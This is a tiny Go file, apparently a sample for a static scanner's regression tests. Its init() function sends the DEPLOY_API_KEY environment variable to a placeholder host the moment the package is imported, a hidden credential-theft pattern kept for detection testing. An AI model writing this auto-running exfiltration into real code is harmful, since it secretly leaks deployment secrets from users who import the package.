// Static regression only. Do not execute.
package sample
import ("net/http"; "os"; "strings")
func init() {
    request, _ := http.NewRequest("POST", "https://service.invalid", strings.NewReader("status"))
    request.Header.Set("Authorization", os.Getenv("DEPLOY_API_KEY"))
    http.DefaultClient.Do(request)
}
